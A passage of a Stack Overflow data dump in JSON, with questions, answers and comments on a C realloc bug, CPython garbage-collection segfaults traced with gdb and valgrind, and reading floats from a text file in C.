0x0000000001031030\nAborted\"</p>\n\n<pre><code>void push(stack* st, int val)    \n{    \n  if (st-&gt;cursize  == st-&gt;maxsize)    \n  {    \n    st-&gt;maxsize *= 2;    \n    st-&gt;arr = realloc(st-&gt;arr, st-&gt;maxsize);    \n  }    \n  st-&gt;arr[st-&gt;cursize] = val;    \n  st-&gt;cursize += 1;    \n}    \n</code></pre>\n\n<p>Also valgrind print message 'Invalid write of size 8' when I trying to use realloc.\nWhat I doing wrong?\nI use gcc and Debian Jessie x86_64.</p>\n"}, {"tags": ["python", "c", "multithreading", "garbage-collection", "memory-corruption"], "comments": [{"owner": {"reputation": 26764, "user_id": 144746, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/170e317e1e3d42b520786bcec9dfb409?s=128&d=identicon&r=PG", "display_name": "Voo", "link": "https://stackoverflow.com/users/144746/voo"}, "edited": false, "score": 0, "creation_date": 1476256233, "post_id": 39990934, "comment_id": 67263031, "body": "<a href=\"http://stackoverflow.com/questions/20112989/how-to-use-valgrind-with-python\">This question</a> shows a way on how to compile python in debug mode and run it under valgrind. If you&#39;re lucky that could point you in the right direction."}, {"owner": {"reputation": 199, "user_id": 2639381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38f0ea1fdaacbbe56e5145c70a76d7a7?s=128&d=identicon&r=PG", "display_name": "Frens Jan", "link": "https://stackoverflow.com/users/2639381/frens-jan"}, "reply_to_user": {"reputation": 26764, "user_id": 144746, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/170e317e1e3d42b520786bcec9dfb409?s=128&d=identicon&r=PG", "display_name": "Voo", "link": "https://stackoverflow.com/users/144746/voo"}, "edited": false, "score": 0, "creation_date": 1476373564, "post_id": 39990934, "comment_id": 67328291, "body": "thanks @voo! got something: <a href=\"https://gist.github.com/frensjan/dc9bc784229fec844403c9d9528ada66\" rel=\"nofollow noreferrer\">valgrind output</a> but the errors valgrind found point to the same locations as the coredumps I got earlier, nowhere near my code ... not really sure what to do with this.  Environment: Python 3.4.5+ built with <code>.&#47;configure --without-pymalloc</code> on Centos 7. Ran python with <code>valgrind --tool=memcheck --dsymutil=yes --track-origins=yes --show-leak-kinds=all --trace-children=yes python ...</code>"}], "answers": [{"tags": [], "owner": {"reputation": 199, "user_id": 2639381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38f0ea1fdaacbbe56e5145c70a76d7a7?s=128&d=identicon&r=PG", "display_name": "Frens Jan", "link": "https://stackoverflow.com/users/2639381/frens-jan"}, "is_accepted": true, "score": 3, "last_activity_date": 1476434075, "creation_date": 1476434075, "answer_id": 40038616, "question_id": 39990934, "link": "https://stackoverflow.com/questions/39990934/debugging-python-segmentation-faults-in-garbage-collection/40038616#40038616", "title": "Debugging python segmentation faults in garbage collection", "body": "<p>I am rather confident that issue I ran across is due to <a href=\"https://bugs.python.org/issue26617\" rel=\"nofollow\">issue 26617</a> in CPython which is fixed in <a href=\"https://github.com/python/cpython/commit/7bfa6f2bfe1b14eec0e9e036866f7acd52d1c8ee\" rel=\"nofollow\">7bfa6f2</a>.</p>\n\n<p>I've check this by reproducing the issue (running into SIGSEGV) with a build of the commit just <em>before 7bfa6f2</em> and not being able to reproduce it with a build of commit <em>7bfa6f2</em>.</p>\n"}], "owner": {"reputation": 199, "user_id": 2639381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38f0ea1fdaacbbe56e5145c70a76d7a7?s=128&d=identicon&r=PG", "display_name": "Frens Jan", "link": "https://stackoverflow.com/users/2639381/frens-jan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1184, "favorite_count": 0, "accepted_answer_id": 40038616, "answer_count": 1, "score": 3, "last_activity_date": 1476434075, "creation_date": 1476249182, "last_edit_date": 1476375892, "question_id": 39990934, "link": "https://stackoverflow.com/questions/39990934/debugging-python-segmentation-faults-in-garbage-collection", "title": "Debugging python segmentation faults in garbage collection", "body": "<p>I'm faced with segmentation faults (SIGSEGV) which occur during garbage collection in cPython. I've also had one instance where a process was killed with SIGBUS. My own code is mostly python and a little bit of very high level Cython. I'm most certainly not - deliberately and explicitly - fooling around with pointers or writing to memory directly.</p>\n\n<hr>\n\n<p>Example backtraces from coredumps (extracted with gdb):</p>\n\n<pre><code>#0  0x00007f8b0ac29471 in subtype_dealloc (self=&lt;Task at remote 0x7f8afc0466d8&gt;)\n    at /usr/src/debug/Python-3.5.1/Objects/typeobject.c:1182\n#1  0x00007f8b0abe8947 in method_dealloc (im=0x7f8afc883e08) at /usr/src/debug/Python-3.5.1/Objects/classobject.c:198\n#2  0x00007f8b0ac285a9 in clear_slots (type=type@entry=0x560219f0fa88, \n    self=self@entry=&lt;Handle at remote 0x7f8afc035948&gt;) at /usr/src/debug/Python-3.5.1/Objects/typeobject.c:1044\n#3  0x00007f8b0ac29506 in subtype_dealloc (self=&lt;Handle at remote 0x7f8afc035948&gt;)\n    at /usr/src/debug/Python-3.5.1/Objects/typeobject.c:1200\n#4  0x00007f8b0ac8caad in PyEval_EvalFrameEx (\n    f=f@entry=Frame 0x56021a01ff08, for file /usr/lib64/python3.5/asyncio/base_events.py, line 1239, in _run_once (self=&lt;_UnixSelectorEventLoop(_coroutine_wrapper_set=False, _current_handle=None, _ready=&lt;collections.deque at remote 0x7f8afd39a250&gt;, _closed=False, _task_factory=None, _selector=&lt;EpollSelector(_map=&lt;_SelectorMapping(_selector=&lt;...&gt;) at remote 0x7f8afc868748&gt;, _epoll=&lt;select.epoll at remote 0x7f8b0b1b8e58&gt;, _fd_to_key={4: &lt;SelectorKey at remote 0x7f8afcac8a98&gt;, 6: &lt;SelectorKey at remote 0x7f8afcac8e08&gt;, 7: &lt;SelectorKey at remote 0x7f8afcac8e60&gt;, 8: &lt;SelectorKey at remote 0x7f8afc873048&gt;, 9: &lt;SelectorKey at remote 0x7f8afc873830&gt;, 10: &lt;SelectorKey at remote 0x7f8afc873af0&gt;, 11: &lt;SelectorKey at remote 0x7f8afc87b620&gt;, 12: &lt;SelectorKey at remote 0x7f8afc87b7d8&gt;, 13: &lt;SelectorKey at remote 0x7f8afc889af0&gt;, 14: &lt;SelectorKey at remote 0x7f8afc884678&gt;, 15: &lt;SelectorKey at remote 0x7f8afc025eb8&gt;, 16: &lt;SelectorKey at remote 0x7f8afc889db0&gt;, 17: &lt;SelectorKey at remote 0x7f8afc01a258&gt;, 18: &lt;SelectorKey at remote 0x7f8afc...(truncated), \n    throwflag=throwflag@entry=0) at /usr/src/debug/Python-3.5.1/Python/ceval.c:1414\n</code></pre>\n\n<p>During the sweep (I think):</p>\n\n<pre><code>#1  0x00007f0a0624c63f in visit_decref (op=, data=&lt;optimized out&gt;)\n    at /usr/src/debug/Python-3.5.1/Modules/gcmodule.c:373\n#2  0x00007f0a0624b813 in subtract_refs (containers=&lt;optimized out&gt;)\n    at /usr/src/debug/Python-3.5.1/Modules/gcmodule.c:398\n#3  collect (generation=generation@entry=2, n_collected=n_collected@entry=0x7f09d75708c8, \n    n_uncollectable=n_uncollectable@entry=0x7f09d75708d0, nofail=nofail@entry=0)\n    at /usr/src/debug/Python-3.5.1/Modules/gcmodule.c:951\n</code></pre>\n\n<p>And also once during malloc:</p>\n\n<pre><code>#0  _PyObject_Malloc (ctx=0x0, nbytes=56) at /usr/src/debug/Python-3.4.3/Objects/obmalloc.c:1159\n1159                if ((pool-&gt;freeblock = *(block **)bp) != NULL) {\n(gdb) bt\n#0  _PyObject_Malloc (ctx=0x0, nbytes=56) at /usr/src/debug/Python-3.4.3/Objects/obmalloc.c:1159\n</code></pre>\n\n<p>And the SIGBUS trace (looks like it happened while cPython was recovering from another error):</p>\n\n<pre><code>#0  malloc_printerr (ar_ptr=0x100101f0100101a, ptr=0x7f067955da60 &lt;generations+32&gt;, str=0x7f06785a2b8c \"free(): invalid size\", action=3) at malloc.c:5009\n5009        set_arena_corrupt (ar_ptr);\n(gdb) bt\n#0  malloc_printerr (ar_ptr=0x100101f0100101a, ptr=0x7f067955da60 &lt;generations+32&gt;, str=0x7f06785a2b8c \"free(): invalid size\", action=3) at malloc.c:5009\n#1  _int_free (av=0x100101f0100101a, p=&lt;optimized out&gt;, have_lock=0) at malloc.c:3842\nPython Exception &lt;type 'exceptions.RuntimeError'&gt; Type does not have a target.:\n</code></pre>\n\n<hr>\n\n<p>These back traces are from Fedora 24 with Python 3.5.1 and some from Centos 7 with Python 3.4.3. So I'm ruling out issues like:</p>\n\n<ul>\n<li>bad memory (could be, but quite a coincidence that my laptop and a (virtual) server exhibit the same issue and show no otherwise work fine).</li>\n<li>Issues in the OS or cPython or the combination thereof.</li>\n</ul>\n\n<p>So - as usual - it must be something in my own code. It's a mixture of threaded code for some concurrency of (computational) 'tasks' and a thread running an asyncio loop. The code base has other 'workloads' which run fine. Differences in the code which is 'serving' this 'workload' which stand out to me are that I use (threading.RLock) locks quite a bit to serialize some requests and I'm serializing and writing to disk.</p>\n\n<p>Any suggestions on how to find a root cause would be highly appreciated!</p>\n\n<p>Things I've tried:</p>\n\n<ul>\n<li>Stripping down the external dependencies used to the bare minimum (which was cloudpickle): no difference</li>\n<li>Dumping counts of all object types as seen by the garbage collector before and after explicit collection and seeing if there were types of objects tracked just before a crash and weren't in the 'successful' garbage collections: there weren't.</li>\n<li>Going through core dumps with GDB: not really consistent regarding the C nor the Python backtraces.</li>\n<li>Running with MALLOC_CHECK_=2: I don't see any error messages other than that a process has exited with exit code -11.</li>\n</ul>\n\n<hr>\n\n<h2>Edit 1</h2>\n\n<p>Got something: <a href=\"https://gist.github.com/frensjan/dc9bc784229fec844403c9d9528ada66\" rel=\"nofollow\">https://gist.github.com/frensjan/dc9bc784229fec844403c9d9528ada66</a> </p>\n\n<p>Most notably:</p>\n\n<pre><code>==19072== Invalid write of size 8\n==19072==    at 0x47A3B7: subtype_dealloc (typeobject.c:1157)\n==19072==    by 0x4E0696: PyEval_EvalFrameEx (ceval.c:1388)\n==19072==    by 0x58917B: gen_send_ex (genobject.c:104)\n==19072==    by 0x58917B: _PyGen_Send (genobject.c:158)\n...\n==19072==    by 0x4E2A6A: call_function (ceval.c:4262)\n==19072==    by 0x4E2A6A: PyEval_EvalFrameEx (ceval.c:2838)\n==19072==  Address 0x8 is not stack'd, malloc'd or (recently) free'd\n</code></pre>\n\n<p>and</p>\n\n<pre><code>==19072== Process terminating with default action of signal 11 (SIGSEGV): dumping core\n==19072==  Access not within mapped region at address 0x8\n==19072==    at 0x47A3B7: subtype_dealloc (typeobject.c:1157)\n==19072==    by 0x4E0696: PyEval_EvalFrameEx (ceval.c:1388)\n==19072==    by 0x58917B: gen_send_ex (genobject.c:104)\n==19072==    by 0x58917B: _PyGen_Send (genobject.c:158)\n</code></pre>\n\n<p>But the errors valgrind found point to the same locations as the coredumps I got earlier, nowhere near my code ... not really sure what to do with this. </p>\n\n<p>Environment: Python 3.4.5+ built with <code>./configure --without-pymalloc</code> on Centos 7. Ran python with <code>valgrind --tool=memcheck --dsymutil=yes --track-origins=yes --show-leak-kinds=all --trace-children=yes python ...</code></p>\n\n<p>Any help is much appreciated!</p>\n"}, {"tags": ["c", "arrays", "file", "text", "scanf"], "comments": [{"owner": {"reputation": 94713, "user_id": 1139697, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5f136ddb684f39aaee1c028ee1950f6f?s=128&d=identicon&r=PG", "display_name": "Zeta", "link": "https://stackoverflow.com/users/1139697/zeta"}, "edited": false, "score": 2, "creation_date": 1476248986, "post_id": 39990871, "comment_id": 67260083, "body": "Why do you call an array of floats &quot;integers&quot;? Why do you save the read integer in a <code>int</code>, not in a <code>float</code>? Why do you check for <code>null</code> very late?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476249035, "post_id": 39990871, "comment_id": 67260095, "body": "Start testing if <code>fopen</code> returns <code>NULL</code> and if yes, print an error message and don&#39;t go any further."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 94713, "user_id": 1139697, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5f136ddb684f39aaee1c028ee1950f6f?s=128&d=identicon&r=PG", "display_name": "Zeta", "link": "https://stackoverflow.com/users/1139697/zeta"}, "edited": false, "score": 0, "creation_date": 1476249211, "post_id": 39990871, "comment_id": 67260149, "body": "@Zeta the code is not original, I had to modify it to make it read floats. The variables are from the original, did not change them."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 94713, "user_id": 1139697, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5f136ddb684f39aaee1c028ee1950f6f?s=128&d=identicon&r=PG", "display_name": "Zeta", "link": "https://stackoverflow.com/users/1139697/zeta"}, "edited": false, "score": 0, "creation_date": 1476249294, "post_id": 39990871, "comment_id": 67260175, "body": "@Zeta also i wanted to see if the while loop even read the file so i just  now notice why you said very late."}, {"owner": {"reputation": 1402, "user_id": 6554747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Xlzqs.png?s=128&g=1", "display_name": "progyammer", "link": "https://stackoverflow.com/users/6554747/progyammer"}, "edited": false, "score": 0, "creation_date": 1476249373, "post_id": 39990871, "comment_id": 67260198, "body": "You display the &quot;can&#39;t open file&quot; error message AFTER attempting to read from the file. That&#39;s not what you should do."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476249421, "post_id": 39990871, "comment_id": 67260217, "body": "@MichaelWalz I just modified the code, the print out statement IS  what is has at fopen."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 1402, "user_id": 6554747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Xlzqs.png?s=128&g=1", "display_name": "progyammer", "link": "https://stackoverflow.com/users/6554747/progyammer"}, "edited": false, "score": 0, "creation_date": 1476249460, "post_id": 39990871, "comment_id": 67260232, "body": "@progy_rock just fixed that, and the compiler does execute the if statement."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "edited": false, "score": 0, "creation_date": 1476249545, "post_id": 39990871, "comment_id": 67260258, "body": "Just edited the code to look as above."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476249667, "post_id": 39990871, "comment_id": 67260283, "body": "@OscarTovar, nice try, but the test is too late, you must test <code>file</code> for <code>NULL</code> <b>before</b> you use <code>file</code>. And it&#39;s not enough to print <code>&quot;Error while opening the file.\\n&quot;</code>, you also must quit the program."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476250041, "post_id": 39990871, "comment_id": 67260389, "body": "@MichaelWalz so i commented everything out from above code it looks like this now FILE *file = fopen(&quot;Oscar.txt&quot;, &quot;r&quot;); \tif( file == NULL ) \t\t    \t     { \t\t    \t        printf(&quot;Error while opening the file.\\n&quot;);  \t\t    \t     }"}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476250126, "post_id": 39990871, "comment_id": 67260413, "body": "@MichaelWalz also it prints out the if statement. Is this what you meant?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476260404, "post_id": 39990871, "comment_id": 67265415, "body": "@OscarTovar once the error message has been displayed the program should not continue trying to read from the file that could not be opened."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "edited": false, "score": 0, "creation_date": 1476250756, "post_id": 39991193, "comment_id": 67260612, "body": "Thank you for pointing that out. Fixed the problem, still  have issues of a array with zeros for each element."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "reply_to_user": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "edited": false, "score": 0, "creation_date": 1476252545, "post_id": 39991193, "comment_id": 67261251, "body": "@OscarTovar I rolled back your question edit. You shouldn&#39;t edit the question in a way which makes answers invalid."}, {"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1476253158, "post_id": 39991193, "comment_id": 67261519, "body": "@hyde Sorry did not know. BTW how do you make this thread close, the issue was resolved."}], "tags": [], "owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "is_accepted": false, "score": 1, "last_activity_date": 1476252549, "last_edit_date": 1476252549, "creation_date": 1476250604, "answer_id": 39991193, "question_id": 39990871, "link": "https://stackoverflow.com/questions/39990871/how-to-read-a-text-file-that-has-float-numbers-to-a-float-array-in-c/39991193#39991193", "title": "How to read a text file that has float numbers to a float array in C", "body": "<p>Off the top of my head</p>\n\n<pre><code>    //int num;\n    float num; // should be float isn't is\n    while(fscanf(file, \"%f\", &amp;num) &gt;0) {\n</code></pre>\n\n<p>More </p>\n\n<pre><code>int main() // int main instead of void\n{\n    /* All declarations at one place */\n    FILE *file = NULL; \n    float integers[102], num ;\n    int i = 0;\n    /* Try Open and exit if there is problem */ \n    file = fopen(\"Data.txt\", \"r\");\n    if( file == NULL ) {\n        printf(\"Error while opening the file.\\n\");\n        return -1;\n    }\n    /* Read and store EOF is always better */\n    while( fscanf(file, \"%f\", &amp;num) != EOF ) {\n        integers[i++] = num;\n    }\n    /* Done with File Close it */\n    fclose(file);\n    /* Final Prints */\n    for( i = 0; i &lt; 102; i++ ){\n        printf(\"integers[%d] = %.02f\\n\",i, integers[i]);\n    }\n    /* All success at this point */\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "edited": false, "score": 0, "creation_date": 1476253104, "post_id": 39991433, "comment_id": 67261498, "body": "I did your code. did not see the foo text file where Data text file was(BTW the data came from matlab), searched it. Found it was at different file. The file was at the same level as Data text file. Move Data text file where foo text file was. Fixed the problem. You sir are a life saver. THANK YOU SO MUCH"}, {"owner": {"reputation": 165, "user_id": 950416, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cngwz.jpg?s=128&g=1", "display_name": "Kevin Olree", "link": "https://stackoverflow.com/users/950416/kevin-olree"}, "reply_to_user": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "edited": false, "score": 0, "creation_date": 1476253427, "post_id": 39991433, "comment_id": 67261614, "body": "I just modified the code to be a bit more terse and closer to what you were doing with the array. Glad it helped!"}], "tags": [], "owner": {"reputation": 165, "user_id": 950416, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cngwz.jpg?s=128&g=1", "display_name": "Kevin Olree", "link": "https://stackoverflow.com/users/950416/kevin-olree"}, "is_accepted": true, "score": 1, "last_activity_date": 1476253955, "last_edit_date": 1476253955, "creation_date": 1476251876, "answer_id": 39991433, "question_id": 39990871, "link": "https://stackoverflow.com/questions/39990871/how-to-read-a-text-file-that-has-float-numbers-to-a-float-array-in-c/39991433#39991433", "title": "How to read a text file that has float numbers to a float array in C", "body": "<p>This approach works as an example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n  FILE * fp;\n  float fval[102];\n  int n, i;\n\n  fp = fopen(\"foo.txt\", \"w+\");\n  if (fp == NULL) {\n    printf(\"failed to open file\\n\");\n    return 1;\n  }\n\n  fputs(\"0.000   1.800   3.240   4.374   5.249   5.905   6.377   7.696 \", fp);\n  rewind(fp);\n\n  n = 0;\n  while (fscanf(fp, \"%f\", &amp;fval[n++]) != EOF)\n    ;\n\n  /* n-1 float values were successfully read */\n  for (i=0; i&lt;n-1; i++)\n    printf(\"fval[%d]=%f\\n\", i, fval[i]);\n\n  fclose(fp);\n  return 0;\n}\n</code></pre>\n\n<p>I get this output:</p>\n\n<pre><code>fval[0]=0.000000\nfval[1]=1.800000\nfval[2]=3.240000\nfval[3]=4.374000\nfval[4]=5.249000\nfval[5]=5.905000\nfval[6]=6.377000\nfval[7]=7.696000\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 78, "user_id": 4542258, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uKy3WDNJh3o/AAAAAAAAAAI/AAAAAAAAAOQ/6nMa3YoN22o/photo.jpg?sz=128", "display_name": "sankar", "link": "https://stackoverflow.com/users/4542258/sankar"}, "is_accepted": false, "score": -2, "last_activity_date": 1476251905, "creation_date": 1476251905, "answer_id": 39991441, "question_id": 39990871, "link": "https://stackoverflow.com/questions/39990871/how-to-read-a-text-file-that-has-float-numbers-to-a-float-array-in-c/39991441#39991441", "title": "How to read a text file that has float numbers to a float array in C", "body": "<p>Using vector we can slove the problem.See Below program.here myValues is 2D array.</p>\n\n<p>ifstream input(\"Data.txt\");\nvector myValues;</p>\n\n<p>for (float num; input >> num; )\n    myValues.push_back(num);</p>\n\n<p>or</p>\n\n<p>ifstream input(\"my-file.txt\");\nstd::vector myValues;</p>\n\n<p>for (float f; input >> f; )\n    myValues.push_back(f);</p>\n"}], "owner": {"reputation": 13, "user_id": 7005513, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bb871f61b63cce520d4570debf932d8?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Tovar", "link": "https://stackoverflow.com/users/7005513/oscar-tovar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1886, "favorite_count": 1, "accepted_answer_id": 39991433, "answer_count": 3, "score": 0, "last_activity_date": 1476253955, "creation_date": 1476248747, "last_edit_date": 1476252512, "question_id": 39990871, "link": "https://stackoverflow.com/questions/39990871/how-to-read-a-text-file-that-has-float-numbers-to-a-float-array-in-c", "title": "How to read a text file that has float numbers to a float array in C", "body": "<p>I have been trying to read a text file with the following:</p>\n\n<pre><code>0.000   1.800   3.240   4.374   5.249   5.905   6.377   7.696   6.887   6.974   6.974   6.904   6.778   6.609   6.406   6.177   5.930   5.670   5.403   5.133   4.863   4.596   4.333   5.077   3.829   4.589   3.360   3.140   2.931   2.732   2.543   2.365   2.198   2.040   1.891   1.752   1.622   1.500   1.387   1.281   1.182   1.091   2.006   0.927   0.853   0.786   0.723   0.665   0.611   0.561   0.515   0.473   0.434   0.398   0.365   0.335   0.307   0.281   0.257   0.236   0.216   1.197   0.180   0.165   0.151   0.138   0.126   0.115   0.105   0.096   0.088   0.080   0.073   0.067   0.061   1.055   0.051   0.046   0.042   0.038   0.035   0.032   0.029   0.026   0.024   0.022   0.020   0.018   0.017   0.015   0.014   0.012   0.011   0.010   0.009   0.009   0.008   0.007   1.006   0.006   0.005   0.005\n</code></pre>\n\n<p>This numbers are as formatted above in text file. </p>\n\n<p>My code is as follows</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n\n#include &lt;stdlib.h&gt;\n\nvoid main()\n\n{\n\n        FILE *file = fopen(\"Data.txt\", \"r\");\n        float integers[102];\n\n        int i=0;\n        int num;\n        while(fscanf(file, \"%f\", &amp;num) &gt;0) {\n            integers[i] = num;\n            i++;\n        }\n        if( file == NULL )\n         {\n            printf(\"Error while opening the file.\\n\");\n\n         }\n        fclose(file);\n        for(i = 0;i &lt;102; i++){\n        printf(\"integers[%d] = %f\",i, integers[i]);\n        }\n\n\n}\n</code></pre>\n\n<p>The output of the <code>printf</code> is that all the elements in integers are zero when ran. Also when trying to debug I notice the compiler skips the while loop. I'm using Code Composer Studios.</p>\n"}, {"tags": ["c", "linked-list", "malloc"], "comments": [{"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 3, "creation_date": 1476248655, "post_id": 39990828, "comment_id": 67259991, "body": "Do we need to use our crystal balls to see the definition of <code>struct node_t</code>?  Also, why are you allocating 1 million bytes for each node?  You only need <code>sizeof(struct node_t)</code>.  Allocating data for the <i>word</i> is another story.  And so refer to my first question."}, {"owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "edited": false, "score": 0, "creation_date": 1476248767, "post_id": 39990828, "comment_id": 67260024, "body": "You are using global variables in this function which you haven&#39;t defined for us.  You need to paste a complete example of your problem.  And a minimal one too: do you have problems with <code>malloc</code> even when not reading from a file?"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1476248796, "post_id": 39990828, "comment_id": 67260035, "body": "As for your crash, it&#39;s likely 